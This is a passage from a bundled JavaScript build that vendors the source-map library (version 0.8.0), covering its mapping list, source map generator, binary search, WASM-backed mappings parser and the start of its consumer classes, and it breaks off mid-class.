  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/mapping-list.js"(exports2) {
    var util = require_util2();
    function generatedPositionAfter(mappingA, mappingB) {
      const lineA = mappingA.generatedLine;
      const lineB = mappingB.generatedLine;
      const columnA = mappingA.generatedColumn;
      const columnB = mappingB.generatedColumn;
      return lineB > lineA || lineB == lineA && columnB >= columnA || util.compareByGeneratedPositionsInflated(mappingA, mappingB) <= 0;
    }
    var MappingList = class {
      constructor() {
        this._array = [];
        this._sorted = true;
        this._last = { generatedLine: -1, generatedColumn: 0 };
      }
      /**
       * Iterate through internal items. This method takes the same arguments that
       * `Array.prototype.forEach` takes.
       *
       * NOTE: The order of the mappings is NOT guaranteed.
       */
      unsortedForEach(aCallback, aThisArg) {
        this._array.forEach(aCallback, aThisArg);
      }
      /**
       * Add the given source mapping.
       *
       * @param Object aMapping
       */
      add(aMapping) {
        if (generatedPositionAfter(this._last, aMapping)) {
          this._last = aMapping;
          this._array.push(aMapping);
        } else {
          this._sorted = false;
          this._array.push(aMapping);
        }
      }
      /**
       * Returns the flat, sorted array of mappings. The mappings are sorted by
       * generated position.
       *
       * WARNING: This method returns internal data without copying, for
       * performance. The return value must NOT be mutated, and should be treated as
       * an immutable borrow. If you want to take ownership, you must make your own
       * copy.
       */
      toArray() {
        if (!this._sorted) {
          this._array.sort(util.compareByGeneratedPositionsInflated);
          this._sorted = true;
        }
        return this._array;
      }
    };
    exports2.MappingList = MappingList;
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/source-map-generator.js
var require_source_map_generator = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/source-map-generator.js"(exports2) {
    var base64VLQ = require_base64_vlq();
    var util = require_util2();
    var ArraySet = require_array_set().ArraySet;
    var MappingList = require_mapping_list().MappingList;
    var SourceMapGenerator = class _SourceMapGenerator {
      constructor(aArgs) {
        if (!aArgs) {
          aArgs = {};
        }
        this._file = util.getArg(aArgs, "file", null);
        this._sourceRoot = util.getArg(aArgs, "sourceRoot", null);
        this._skipValidation = util.getArg(aArgs, "skipValidation", false);
        this._sources = new ArraySet();
        this._names = new ArraySet();
        this._mappings = new MappingList();
        this._sourcesContents = null;
      }
      /**
       * Creates a new SourceMapGenerator based on a SourceMapConsumer
       *
       * @param aSourceMapConsumer The SourceMap.
       */
      static fromSourceMap(aSourceMapConsumer) {
        const sourceRoot = aSourceMapConsumer.sourceRoot;
        const generator = new _SourceMapGenerator({
          file: aSourceMapConsumer.file,
          sourceRoot
        });
        aSourceMapConsumer.eachMapping(function(mapping) {
          const newMapping = {
            generated: {
              line: mapping.generatedLine,
              column: mapping.generatedColumn
            }
          };
          if (mapping.source != null) {
            newMapping.source = mapping.source;
            if (sourceRoot != null) {
              newMapping.source = util.relative(sourceRoot, newMapping.source);
            }
            newMapping.original = {
              line: mapping.originalLine,
              column: mapping.originalColumn
            };
            if (mapping.name != null) {
              newMapping.name = mapping.name;
            }
          }
          generator.addMapping(newMapping);
        });
        aSourceMapConsumer.sources.forEach(function(sourceFile) {
          let sourceRelative = sourceFile;
          if (sourceRoot != null) {
            sourceRelative = util.relative(sourceRoot, sourceFile);
          }
          if (!generator._sources.has(sourceRelative)) {
            generator._sources.add(sourceRelative);
          }
          const content = aSourceMapConsumer.sourceContentFor(sourceFile);
          if (content != null) {
            generator.setSourceContent(sourceFile, content);
          }
        });
        return generator;
      }
      /**
       * Add a single mapping from original source line and column to the generated
       * source's line and column for this source map being created. The mapping
       * object should have the following properties:
       *
       *   - generated: An object with the generated line and column positions.
       *   - original: An object with the original line and column positions.
       *   - source: The original source file (relative to the sourceRoot).
       *   - name: An optional original token name for this mapping.
       */
      addMapping(aArgs) {
        const generated = util.getArg(aArgs, "generated");
        const original = util.getArg(aArgs, "original", null);
        let source = util.getArg(aArgs, "source", null);
        let name = util.getArg(aArgs, "name", null);
        if (!this._skipValidation) {
          this._validateMapping(generated, original, source, name);
        }
        if (source != null) {
          source = String(source);
          if (!this._sources.has(source)) {
            this._sources.add(source);
          }
        }
        if (name != null) {
          name = String(name);
          if (!this._names.has(name)) {
            this._names.add(name);
          }
        }
        this._mappings.add({
          generatedLine: generated.line,
          generatedColumn: generated.column,
          originalLine: original && original.line,
          originalColumn: original && original.column,
          source,
          name
        });
      }
      /**
       * Set the source content for a source file.
       */
      setSourceContent(aSourceFile, aSourceContent) {
        let source = aSourceFile;
        if (this._sourceRoot != null) {
          source = util.relative(this._sourceRoot, source);
        }
        if (aSourceContent != null) {
          if (!this._sourcesContents) {
            this._sourcesContents = /* @__PURE__ */ Object.create(null);
          }
          this._sourcesContents[util.toSetString(source)] = aSourceContent;
        } else if (this._sourcesContents) {
          delete this._sourcesContents[util.toSetString(source)];
          if (Object.keys(this._sourcesContents).length === 0) {
            this._sourcesContents = null;
          }
        }
      }
      /**
       * Applies the mappings of a sub-source-map for a specific source file to the
       * source map being generated. Each mapping to the supplied source file is
       * rewritten using the supplied source map. Note: The resolution for the
       * resulting mappings is the minimium of this map and the supplied map.
       *
       * @param aSourceMapConsumer The source map to be applied.
       * @param aSourceFile Optional. The filename of the source file.
       *        If omitted, SourceMapConsumer's file property will be used.
       * @param aSourceMapPath Optional. The dirname of the path to the source map
       *        to be applied. If relative, it is relative to the SourceMapConsumer.
       *        This parameter is needed when the two source maps aren't in the same
       *        directory, and the source map to be applied contains relative source
       *        paths. If so, those relative source paths need to be rewritten
       *        relative to the SourceMapGenerator.
       */
      applySourceMap(aSourceMapConsumer, aSourceFile, aSourceMapPath) {
        let sourceFile = aSourceFile;
        if (aSourceFile == null) {
          if (aSourceMapConsumer.file == null) {
            throw new Error(
              `SourceMapGenerator.prototype.applySourceMap requires either an explicit source file, or the source map's "file" property. Both were omitted.`
            );
          }
          sourceFile = aSourceMapConsumer.file;
        }
        const sourceRoot = this._sourceRoot;
        if (sourceRoot != null) {
          sourceFile = util.relative(sourceRoot, sourceFile);
        }
        const newSources = this._mappings.toArray().length > 0 ? new ArraySet() : this._sources;
        const newNames = new ArraySet();
        this._mappings.unsortedForEach(function(mapping) {
          if (mapping.source === sourceFile && mapping.originalLine != null) {
            const original = aSourceMapConsumer.originalPositionFor({
              line: mapping.originalLine,
              column: mapping.originalColumn
            });
            if (original.source != null) {
              mapping.source = original.source;
              if (aSourceMapPath != null) {
                mapping.source = util.join(aSourceMapPath, mapping.source);
              }
              if (sourceRoot != null) {
                mapping.source = util.relative(sourceRoot, mapping.source);
              }
              mapping.originalLine = original.line;
              mapping.originalColumn = original.column;
              if (original.name != null) {
                mapping.name = original.name;
              }
            }
          }
          const source = mapping.source;
          if (source != null && !newSources.has(source)) {
            newSources.add(source);
          }
          const name = mapping.name;
          if (name != null && !newNames.has(name)) {
            newNames.add(name);
          }
        }, this);
        this._sources = newSources;
        this._names = newNames;
        aSourceMapConsumer.sources.forEach(function(srcFile) {
          const content = aSourceMapConsumer.sourceContentFor(srcFile);
          if (content != null) {
            if (aSourceMapPath != null) {
              srcFile = util.join(aSourceMapPath, srcFile);
            }
            if (sourceRoot != null) {
              srcFile = util.relative(sourceRoot, srcFile);
            }
            this.setSourceContent(srcFile, content);
          }
        }, this);
      }
      /**
       * A mapping can have one of the three levels of data:
       *
       *   1. Just the generated position.
       *   2. The Generated position, original position, and original source.
       *   3. Generated and original position, original source, as well as a name
       *      token.
       *
       * To maintain consistency, we validate that any new mapping being added falls
       * in to one of these categories.
       */
      _validateMapping(aGenerated, aOriginal, aSource, aName) {
        if (aOriginal && typeof aOriginal.line !== "number" && typeof aOriginal.column !== "number") {
          throw new Error(
            "original.line and original.column are not numbers -- you probably meant to omit the original mapping entirely and only map the generated position. If so, pass null for the original mapping instead of an object with empty or null values."
          );
        }
        if (aGenerated && "line" in aGenerated && "column" in aGenerated && aGenerated.line > 0 && aGenerated.column >= 0 && !aOriginal && !aSource && !aName) {
        } else if (aGenerated && "line" in aGenerated && "column" in aGenerated && aOriginal && "line" in aOriginal && "column" in aOriginal && aGenerated.line > 0 && aGenerated.column >= 0 && aOriginal.line > 0 && aOriginal.column >= 0 && aSource) {
        } else {
          throw new Error(
            "Invalid mapping: " + JSON.stringify({
              generated: aGenerated,
              source: aSource,
              original: aOriginal,
              name: aName
            })
          );
        }
      }
      /**
       * Serialize the accumulated mappings in to the stream of base 64 VLQs
       * specified by the source map format.
       */
      _serializeMappings() {
        let previousGeneratedColumn = 0;
        let previousGeneratedLine = 1;
        let previousOriginalColumn = 0;
        let previousOriginalLine = 0;
        let previousName = 0;
        let previousSource = 0;
        let result = "";
        let next;
        let mapping;
        let nameIdx;
        let sourceIdx;
        const mappings = this._mappings.toArray();
        for (let i = 0, len = mappings.length; i < len; i++) {
          mapping = mappings[i];
          next = "";
          if (mapping.generatedLine !== previousGeneratedLine) {
            previousGeneratedColumn = 0;
            while (mapping.generatedLine !== previousGeneratedLine) {
              next += ";";
              previousGeneratedLine++;
            }
          } else if (i > 0) {
            if (!util.compareByGeneratedPositionsInflated(mapping, mappings[i - 1])) {
              continue;
            }
            next += ",";
          }
          next += base64VLQ.encode(
            mapping.generatedColumn - previousGeneratedColumn
          );
          previousGeneratedColumn = mapping.generatedColumn;
          if (mapping.source != null) {
            sourceIdx = this._sources.indexOf(mapping.source);
            next += base64VLQ.encode(sourceIdx - previousSource);
            previousSource = sourceIdx;
            next += base64VLQ.encode(
              mapping.originalLine - 1 - previousOriginalLine
            );
            previousOriginalLine = mapping.originalLine - 1;
            next += base64VLQ.encode(
              mapping.originalColumn - previousOriginalColumn
            );
            previousOriginalColumn = mapping.originalColumn;
            if (mapping.name != null) {
              nameIdx = this._names.indexOf(mapping.name);
              next += base64VLQ.encode(nameIdx - previousName);
              previousName = nameIdx;
            }
          }
          result += next;
        }
        return result;
      }
      _generateSourcesContent(aSources, aSourceRoot) {
        return aSources.map(function(source) {
          if (!this._sourcesContents) {
            return null;
          }
          if (aSourceRoot != null) {
            source = util.relative(aSourceRoot, source);
          }
          const key = util.toSetString(source);
          return Object.prototype.hasOwnProperty.call(this._sourcesContents, key) ? this._sourcesContents[key] : null;
        }, this);
      }
      /**
       * Externalize the source map.
       */
      toJSON() {
        const map = {
          version: this._version,
          sources: this._sources.toArray(),
          names: this._names.toArray(),
          mappings: this._serializeMappings()
        };
        if (this._file != null) {
          map.file = this._file;
        }
        if (this._sourceRoot != null) {
          map.sourceRoot = this._sourceRoot;
        }
        if (this._sourcesContents) {
          map.sourcesContent = this._generateSourcesContent(
            map.sources,
            map.sourceRoot
          );
        }
        return map;
      }
      /**
       * Render the source map being generated to a string.
       */
      toString() {
        return JSON.stringify(this.toJSON());
      }
    };
    SourceMapGenerator.prototype._version = 3;
    exports2.SourceMapGenerator = SourceMapGenerator;
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/binary-search.js
var require_binary_search = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/binary-search.js"(exports2) {
    exports2.GREATEST_LOWER_BOUND = 1;
    exports2.LEAST_UPPER_BOUND = 2;
    function recursiveSearch(aLow, aHigh, aNeedle, aHaystack, aCompare, aBias) {
      const mid = Math.floor((aHigh - aLow) / 2) + aLow;
      const cmp = aCompare(aNeedle, aHaystack[mid], true);
      if (cmp === 0) {
        return mid;
      } else if (cmp > 0) {
        if (aHigh - mid > 1) {
          return recursiveSearch(mid, aHigh, aNeedle, aHaystack, aCompare, aBias);
        }
        if (aBias === exports2.LEAST_UPPER_BOUND) {
          return aHigh < aHaystack.length ? aHigh : -1;
        }
        return mid;
      }
      if (mid - aLow > 1) {
        return recursiveSearch(aLow, mid, aNeedle, aHaystack, aCompare, aBias);
      }
      if (aBias == exports2.LEAST_UPPER_BOUND) {
        return mid;
      }
      return aLow < 0 ? -1 : aLow;
    }
    exports2.search = function search(aNeedle, aHaystack, aCompare, aBias) {
      if (aHaystack.length === 0) {
        return -1;
      }
      let index = recursiveSearch(
        -1,
        aHaystack.length,
        aNeedle,
        aHaystack,
        aCompare,
        aBias || exports2.GREATEST_LOWER_BOUND
      );
      if (index < 0) {
        return -1;
      }
      while (index - 1 >= 0) {
        if (aCompare(aHaystack[index], aHaystack[index - 1], true) !== 0) {
          break;
        }
        --index;
      }
      return index;
    };
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/read-wasm.js
var require_read_wasm = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/read-wasm.js"(exports2, module2) {
    "use strict";
    var fs2 = require("fs");
    var path2 = require("path");
    module2.exports = function readWasm() {
      return new Promise((resolve2, reject) => {
        const wasmPath = path2.join(__dirname, "mappings.wasm");
        fs2.readFile(wasmPath, null, (error, data) => {
          if (error) {
            reject(error);
            return;
          }
          resolve2(data.buffer);
        });
      });
    };
    module2.exports.initialize = (_) => {
      console.debug(
        "SourceMapConsumer.initialize is a no-op when running in node.js"
      );
    };
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/wasm.js
var require_wasm = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/wasm.js"(exports2, module2) {
    var readWasm = require_read_wasm();
    function Mapping() {
      this.generatedLine = 0;
      this.generatedColumn = 0;
      this.lastGeneratedColumn = null;
      this.source = null;
      this.originalLine = null;
      this.originalColumn = null;
      this.name = null;
    }
    var cachedWasm = null;
    module2.exports = function wasm() {
      if (cachedWasm) {
        return cachedWasm;
      }
      const callbackStack = [];
      cachedWasm = readWasm().then((buffer) => {
        return WebAssembly.instantiate(buffer, {
          env: {
            mapping_callback(generatedLine, generatedColumn, hasLastGeneratedColumn, lastGeneratedColumn, hasOriginal, source, originalLine, originalColumn, hasName, name) {
              const mapping = new Mapping();
              mapping.generatedLine = generatedLine + 1;
              mapping.generatedColumn = generatedColumn;
              if (hasLastGeneratedColumn) {
                mapping.lastGeneratedColumn = lastGeneratedColumn - 1;
              }
              if (hasOriginal) {
                mapping.source = source;
                mapping.originalLine = originalLine + 1;
                mapping.originalColumn = originalColumn;
                if (hasName) {
                  mapping.name = name;
                }
              }
              callbackStack[callbackStack.length - 1](mapping);
            },
            start_all_generated_locations_for() {
              console.time("all_generated_locations_for");
            },
            end_all_generated_locations_for() {
              console.timeEnd("all_generated_locations_for");
            },
            start_compute_column_spans() {
              console.time("compute_column_spans");
            },
            end_compute_column_spans() {
              console.timeEnd("compute_column_spans");
            },
            start_generated_location_for() {
              console.time("generated_location_for");
            },
            end_generated_location_for() {
              console.timeEnd("generated_location_for");
            },
            start_original_location_for() {
              console.time("original_location_for");
            },
            end_original_location_for() {
              console.timeEnd("original_location_for");
            },
            start_parse_mappings() {
              console.time("parse_mappings");
            },
            end_parse_mappings() {
              console.timeEnd("parse_mappings");
            },
            start_sort_by_generated_location() {
              console.time("sort_by_generated_location");
            },
            end_sort_by_generated_location() {
              console.timeEnd("sort_by_generated_location");
            },
            start_sort_by_original_location() {
              console.time("sort_by_original_location");
            },
            end_sort_by_original_location() {
              console.timeEnd("sort_by_original_location");
            }
          }
        });
      }).then((Wasm) => {
        return {
          exports: Wasm.instance.exports,
          withMappingCallback: (mappingCallback, f) => {
            callbackStack.push(mappingCallback);
            try {
              f();
            } finally {
              callbackStack.pop();
            }
          }
        };
      }).then(null, (e) => {
        cachedWasm = null;
        throw e;
      });
      return cachedWasm;
    };
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/source-map-consumer.js
var require_source_map_consumer = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/source-map-consumer.js"(exports2) {
    var util = require_util2();
    var binarySearch = require_binary_search();
    var ArraySet = require_array_set().ArraySet;
    var base64VLQ = require_base64_vlq();
    var readWasm = require_read_wasm();
    var wasm = require_wasm();
    var INTERNAL = /* @__PURE__ */ Symbol("smcInternal");
    var SourceMapConsumer = class _SourceMapConsumer {
      constructor(aSourceMap, aSourceMapURL) {
        if (aSourceMap == INTERNAL) {
          return Promise.resolve(this);
        }
        return _factory(aSourceMap, aSourceMapURL);
      }
      static initialize(opts) {
        readWasm.initialize(opts["lib/mappings.wasm"]);
      }
      static fromSourceMap(aSourceMap, aSourceMapURL) {
        return _factoryBSM(aSourceMap, aSourceMapURL);
      }
      /**
       * Construct a new `SourceMapConsumer` from `rawSourceMap` and `sourceMapUrl`
       * (see the `SourceMapConsumer` constructor for details. Then, invoke the `async
       * function f(SourceMapConsumer) -> T` with the newly constructed consumer, wait
       * for `f` to complete, call `destroy` on the consumer, and return `f`'s return
       * value.
       *
       * You must not use the consumer after `f` completes!
       *
       * By using `with`, you do not have to remember to manually call `destroy` on
       * the consumer, since it will be called automatically once `f` completes.
       *
       * ```js
       * const xSquared = await SourceMapConsumer.with(
       *   myRawSourceMap,
       *   null,
       *   async function (consumer) {
       *     // Use `consumer` inside here and don't worry about remembering
       *     // to call `destroy`.
       *
       *     const x = await whatever(consumer);
       *     return x * x;
       *   }
       * );
       *
       * // You may not use that `consumer` anymore out here; it has
       * // been destroyed. But you can use `xSquared`.
       * console.log(xSquared);
       * ```
       */
      static async with(rawSourceMap, sourceMapUrl, f) {
        const consumer = await new _SourceMapConsumer(rawSourceMap, sourceMapUrl);
        try {
          return await f(consumer);
        } finally {
          consumer.destroy();
        }
      }
      /**
       * Iterate over each mapping between an original source/line/column and a
       * generated line/column in this source map.
       *
       * @param Function aCallback
       *        The function that is called with each mapping.
       * @param Object aContext
       *        Optional. If specified, this object will be the value of `this` every
       *        time that `aCallback` is called.
       * @param aOrder
       *        Either `SourceMapConsumer.GENERATED_ORDER` or
       *        `SourceMapConsumer.ORIGINAL_ORDER`. Specifies whether you want to
       *        iterate over the mappings sorted by the generated file's line/column
       *        order or the original's source/line/column order, respectively. Defaults to
       *        `SourceMapConsumer.GENERATED_ORDER`.
       */
      eachMapping(aCallback, aContext, aOrder) {
        throw new Error("Subclasses must implement eachMapping");
      }
      /**
       * Returns all generated line and column information for the original source,
       * line, and column provided. If no column is provided, returns all mappings
       * corresponding to a either the line we are searching for or the next
       * closest line that has any mappings. Otherwise, returns all mappings
       * corresponding to the given line and either the column we are searching for
       * or the next closest column that has any offsets.
       *
       * The only argument is an object with the following properties:
       *
       *   - source: The filename of the original source.
       *   - line: The line number in the original source.  The line number is 1-based.
       *   - column: Optional. the column number in the original source.
       *    The column number is 0-based.
       *
       * and an array of objects is returned, each with the following properties:
       *
       *   - line: The line number in the generated source, or null.  The
       *    line number is 1-based.
       *   - column: The column number in the generated source, or null.
       *    The column number is 0-based.
       */
      allGeneratedPositionsFor(aArgs) {
        throw new Error("Subclasses must implement allGeneratedPositionsFor");
      }
      destroy() {
        throw new Error("Subclasses must implement destroy");
      }
    };
    SourceMapConsumer.prototype._version = 3;
    SourceMapConsumer.GENERATED_ORDER = 1;
    SourceMapConsumer.ORIGINAL_ORDER = 2;
    SourceMapConsumer.GREATEST_LOWER_BOUND = 1;
    SourceMapConsumer.LEAST_UPPER_BOUND = 2;
    exports2.SourceMapConsumer = SourceMapConsumer;
    var BasicSourceMapConsumer = class _BasicSourceMapConsumer extends SourceMapConsumer {
      constructor(aSourceMap, aSourceMapURL) {
        return super(INTERNAL).then((that) => {
          let sourceMap = aSourceMap;
          if (typeof aSourceMap === "string") {
            sourceMap = util.parseSourceMapInput(aSourceMap);
          }
          const version = util.getArg(sourceMap, "version");
          const sources = util.getArg(sourceMap, "sources").map(String);
          const names = util.getArg(sourceMap, "names", []);
          const sourceRoot = util.getArg(sourceMap, "sourceRoot", null);
          const sourcesContent = util.getArg(sourceMap, "sourcesContent", null);
          const mappings = util.getArg(sourceMap, "mappings");
          const file = util.getArg(sourceMap, "file", null);
          const x_google_ignoreList = util.getArg(
            sourceMap,
            "x_google_ignoreList",
            null
          );
          if (version != that._version) {
            throw new Error("Unsupported version: " + version);
          }
          that._sourceLookupCache = /* @__PURE__ */ new Map();
          that._names = ArraySet.fromArray(names.map(String), true);
          that._sources = ArraySet.fromArray(sources, true);
          that._absoluteSources = ArraySet.fromArray(
            that._sources.toArray().map(function(s) {
              return util.computeSourceURL(sourceRoot, s, aSourceMapURL);
            }),
            true
          );
          that.sourceRoot = sourceRoot;
          that.sourcesContent = sourcesContent;
          that._mappings = mappings;
          that._sourceMapURL = aSourceMapURL;
          that.file = file;
          that.x_google_ignoreList = x_google_ignoreList;
          that._computedColumnSpans = false;
          that._mappingsPtr = 0;
          that._wasm = null;
          return wasm().then((w) => {
            that._wasm = w;
            return that;
          });
        });
      }
      /**
       * Utility function to find the index of a source.  Returns -1 if not
       * found.
       */
      _findSourceIndex(aSource) {
        const cachedIndex = this._sourceLookupCache.get(aSource);
        if (typeof cachedIndex === "number") {
          return cachedIndex;
        }
        const sourceAsMapRelative = util.computeSourceURL(
          null,
          aSource,
          this._sourceMapURL
        );
        if (this._absoluteSources.has(sourceAsMapRelative)) {
          const index = this._absoluteSources.indexOf(sourceAsMapRelative);
          this._sourceLookupCache.set(aSource, index);
          return index;
        }
        const sourceAsSourceRootRelative = util.computeSourceURL(
          this.sourceRoot,
          aSource,
          this._sourceMapURL
        );
        if (this._absoluteSources.has(sourceAsSourceRootRelative)) {
          const index = this._absoluteSources.indexOf(sourceAsSourceRootRelative);
          this._sourceLookupCache.set(aSource, index);
          return index;
        }
        return -1;
      }
      /**
       * Create a BasicSourceMapConsumer from a SourceMapGenerator.
       *
       * @param SourceMapGenerator aSourceMap
       *        The source map that will be consumed.
       * @param String aSourceMapURL
       *        The URL at which the source map can be found (optional)
       * @returns BasicSourceMapConsumer
       */
      static fromSourceMap(aSourceMap, aSourceMapURL) {
        return new _BasicSourceMapConsumer(aSourceMap.toString());
      }
      get sources() {
        return this._absoluteSources.toArray();
      }
      _getMappingsPtr() {
        if (this._mappingsPtr === 0) {
          this._parseMappings();
        }
        return this._mappingsPtr;
      }
      /**
       * Parse the mappings in a string in to a data structure which we can easily
       * query (the ordered arrays in the `this.__generatedMappings` and
       * `this.__originalMappings` properties).
       */
      _parseMappings() {
        const aStr = this._mappings;
        const size = aStr.length;
        const mappingsBufPtr = this._wasm.exports.allocate_mappings(size) >>> 0;
        const mappingsBuf = new Uint8Array(
          this._wasm.exports.memory.buffer,
          mappingsBufPtr,
          size
        );
        for (let i = 0; i < size; i++) {
          mappingsBuf[i] = aStr.charCodeAt(i);
        }
        const mappingsPtr = this._wasm.exports.parse_mappings(mappingsBufPtr);
        if (!mappingsPtr) {
          const error = this._wasm.exports.get_last_error();
          let msg = `Error parsing mappings (code ${error}): `;
          switch (error) {
            case 1:
              msg += "the mappings contained a negative line, column, source index, or name index";
              break;
            case 2:
              msg += "the mappings contained a number larger than 2**32";
              break;
            case 3:
              msg += "reached EOF while in the middle of parsing a VLQ";
              break;
            case 4:
              msg += "invalid base 64 character while parsing a VLQ";
              break;
            default:
              msg += "unknown error code";
              break;
          }
          throw new Error(msg);
        }
        this._mappingsPtr = mappingsPtr;
      }
      eachMapping(aCallback, aContext, aOrder) {
        const context = aContext || null;
        const order = aOrder || SourceMapConsumer.GENERATED_ORDER;
        this._wasm.withMappingCallback(
          (mapping) => {
            if (mapping.source !== null) {
              mapping.source = this._absoluteSources.at(mapping.source);
              if (mapping.name !== null) {
                mapping.name = this._names.at(mapping.name);
              }
            }
            if (this._computedColumnSpans && mapping.lastGeneratedColumn === null) {
              mapping.lastGeneratedColumn = Infinity;
            }
            aCallback.call(context, mapping);
          },
          () => {
            switch (order) {
              case SourceMapConsumer.GENERATED_ORDER:
                this._wasm.exports.by_generated_location(this._getMappingsPtr());
                break;
              case SourceMapConsumer.ORIGINAL_ORDER:
                this._wasm.exports.by_original_location(this._getMappingsPtr());
                break;
              default:
                throw new Error("Unknown order of iteration.");
            }
          }
        );
      }
      allGeneratedPositionsFor(aArgs) {
        let source = util.getArg(aArgs, "source");
        const originalLine = util.getArg(aArgs, "line");
        const originalColumn = aArgs.column || 0;
        source = this._findSourceIndex(source);
        if (source < 0) {
          return [];
        }
        if (originalLine < 1) {
          throw new Error("Line numbers must be >= 1");
        }
        if (originalColumn < 0) {
          throw new Error("Column numbers must be >= 0");
        }
        const mappings = [];
        this._wasm.withMappingCallback(
          (m) => {
            let lastColumn = m.lastGeneratedColumn;
            if (this._computedColumnSpans && lastColumn === null) {
              lastColumn = Infinity;
            }
            mappings.push({
              line: m.generatedLine,
              column: m.generatedColumn,
              lastColumn
            });
          },
          () => {
            this._wasm.exports.all_generated_locations_for(
              this._getMappingsPtr(),
              source,
              originalLine - 1,
              "column" in aArgs,
              originalColumn
            );
          }
        );
        return mappings;
      }
      destroy() {
        if (this._mappingsPtr !== 0) {
          this._wasm.exports.free_mappings(this._mappingsPtr);
          this._mappingsPtr = 0;
        }
      }
      /**
       * Compute the last column for each generated mapping. The last column is
       * inclusive.
       */
      computeColumnSpans() {
        if (this._computedColumnSpans) {
          return;
        }
        this._wasm.exports.compute_column_spans(this._getMappingsPtr());
        this._computedColumnSpans = true;
      }
      /**
       * Returns the original source, line, and column information for the generated
       * source's line and column positions provided. The only argument is an object
       * with the following properties:
       *
       *   - line: The line number in the generated source.  The line number
       *     is 1-based.
       *   - column: The column number in the generated source.  The column
       *     number is 0-based.
       *   - bias: Either 'SourceMapConsumer.GREATEST_LOWER_BOUND' or
       *     'SourceMapConsumer.LEAST_UPPER_BOUND'. Specifies whether to return the
       *     closest element that is smaller than or greater than the one we are
       *     searching for, respectively, if the exact element cannot be found.
       *     Defaults to 'SourceMapConsumer.GREATEST_LOWER_BOUND'.
       *
       * and an object is returned with the following properties:
       *
       *   - source: The original source file, or null.
       *   - line: The line number in the original source, or null.  The
       *     line number is 1-based.
       *   - column: The column number in the original source, or null.  The
       *     column number is 0-based.
       *   - name: The original identifier, or null.
       */
      originalPositionFor(aArgs) {
        const needle = {
          generatedLine: util.getArg(aArgs, "line"),
          generatedColumn: util.getArg(aArgs, "column")
        };
        if (needle.generatedLine < 1) {
          throw new Error("Line numbers must be >= 1");
        }
        if (needle.generatedColumn < 0) {
          throw new Error("Column numbers must be >= 0");
        }
        let bias = util.getArg(
          aArgs,
          "bias",
          SourceMapConsumer.GREATEST_LOWER_BOUND
        );
        if (bias == null) {
          bias = SourceMapConsumer.GREATEST_LOWER_BOUND;
        }
        let mapping;
        this._wasm.withMappingCallback(
          (m) => mapping = m,
          () => {
            this._wasm.exports.original_location_for(
              this._getMappingsPtr(),
              needle.generatedLine - 1,
              needle.generatedColumn,
              bias
            );
          }
        );
        if (mapping) {
          if (mapping.generatedLine === needle.generatedLine) {
            let source = util.getArg(mapping, "source", null);
            if (source !== null) {
              source = this._absoluteSources.at(source);
            }
            let name = util.getArg(mapping, "name", null);
            if (name !== null) {
              name = this._names.at(name);
            }
            return {
              source,
              line: util.getArg(mapping, "originalLine", null),
              column: util.getArg(mapping, "originalColumn", null),
              name
            };
          }
        }
        return {
          source: null,
          line: null,
          column: null,
          name: null
        };
      }
      /**
       * Return true if we have the source content for every source in the source
       * map, false otherwise.
       */
      hasContentsOfAllSources() {
        if (!this.sourcesContent) {
          return false;
        }
        return this.sourcesContent.length >= this._sources.size() && !this.sourcesContent.some(function(sc) {
          return sc == null;
        });
      }
      /**
       * Returns the original source content. The only argument is the url of the
       * original source file. Returns null if no original source content is
       * available.
       */
      sourceContentFor(aSource, nullOnMissing) {
        if (!this.sourcesContent) {
          return null;
        }
        const index = this._findSourceIndex(aSource);
        if (index >= 0) {
          return this.sourcesContent[index];
        }
        if (nullOnMissing) {
          return null;
        }
        throw new Error('"' + aSource + '" is not in the SourceMap.');
      }
      /**
       * Returns the generated line and column information for the original source,
       * line, and column positions provided. The only argument is an object with
       * the following properties:
       *
       *   - source: The filename of the original source.
       *   - line: The line number in the original source.  The line number
       *     is 1-based.
       *   - column: The column number in the original source.  The column
       *     number is 0-based.
       *   - bias: Either 'SourceMapConsumer.GREATEST_LOWER_BOUND' or
       *     'SourceMapConsumer.LEAST_UPPER_BOUND'. Specifies whether to return the
       *     closest element that is smaller than or greater than the one we are
       *     searching for, respectively, if the exact element cannot be found.
       *     Defaults to 'SourceMapConsumer.GREATEST_LOWER_BOUND'.
       *
       * and an object is returned with the following properties:
       *
       *   - line: The line number in the generated source, or null.  The
       *     line number is 1-based.
       *   - column: The column number in the generated source, or null.
       *     The column number is 0-based.
       */
      generatedPositionFor(aArgs) {
        let source = util.getArg(aArgs, "source");
        source = this._findSourceIndex(source);
        if (source < 0) {
          return {
            line: null,
            column: null,
            lastColumn: null
          };
        }
        const needle = {
          source,
          originalLine: util.getArg(aArgs, "line"),
          originalColumn: util.getArg(aArgs, "column")
        };
        if (needle.originalLine < 1) {
          throw new Error("Line numbers must be >= 1");
        }
        if (needle.originalColumn < 0) {
          throw new Error("Column numbers must be >= 0");
        }
        let bias = util.getArg(
          aArgs,
          "bias",
          SourceMapConsumer.GREATEST_LOWER_BOUND
        );
        if (bias == null) {
          bias = SourceMapConsumer.GREATEST_LOWER_BOUND;
        }
        let mapping;
        this._wasm.withMappingCallback(
          (m) => mapping = m,
          () => {
            this._wasm.exports.generated_location_for(
              this._getMappingsPtr(),
              needle.source,
              needle.originalLine - 1,
              needle.originalColumn,
              bias
            );
          }
        );
        if (mapping) {
          if (mapping.source === needle.source) {
            let lastColumn = mapping.lastGeneratedColumn;
            if (this._computedColumnSpans && lastColumn === null) {
              lastColumn = Infinity;
            }
            return {
              line: util.getArg(mapping, "generatedLine", null),
              column: util.getArg(mapping, "generatedColumn", null),
              lastColumn
            };
          }
        }
        return {
          line: null,
          column: null,
          lastColumn: null
        };
      }
    };
    BasicSourceMapConsumer.prototype.consumer = SourceMapConsumer;
    exports2.BasicSourceMapConsumer = BasicSourceMapConsumer;
    var IndexedSourceMapConsumer = class extends SourceMapConsumer {
